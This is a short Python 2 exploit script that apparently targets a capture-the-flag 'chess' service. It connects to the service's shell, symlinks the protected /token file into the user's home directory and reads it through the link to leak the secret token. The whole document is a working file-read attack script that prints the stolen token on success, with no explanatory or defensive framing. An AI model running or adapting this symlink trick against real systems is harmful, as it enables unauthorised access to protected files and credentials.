import sys
import socket
import os
import struct

def readuntil( s, u ):
    z = ''

    while z.endswith( u ) == False:
        z += s.recv(1)

    return z

def readline( s ):
    return readuntil( s, '\n')

def eatprompt(s):
    return readuntil( s, 'chess$ ')

def main( argv ):
    if len(argv) == 3:
        HOST=argv[1]
        PORT=int(argv[2])
    else:
        if 'HOST' not in os.environ or 'PORT' not in os.environ:
            print '[ERROR] target and port must be specified via arguments or variables.'
            sys.exit(1)

        HOST=os.environ['HOST']
        PORT=int(os.environ['PORT'])

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect((HOST, PORT))
    except:
        print '[FAIL] Failed to connect to target %s:%d' %(HOST, PORT)
        sys.exit(1)

    print '[INFO] Connected to %s:%d' %(HOST, PORT)

    eatprompt(s)

    tokenfile = "/token"

    ### create the symbolic link
    s.send('ln -s /token /home/chess/token\n')
    eatprompt(s)
    s.send('cat /home/chess/token\n')
    leak = eatprompt(s)

    if leak.find('permission') != -1:
        print '[ERROR] Failed to leak the token file'
    else:
        print '[SUCCESS] TOKEN: %s' %leak[:32]

    s.send('exit\n')
    s.close()
    sys.exit(0)

if __name__ == '__main__':
    main(sys.argv)
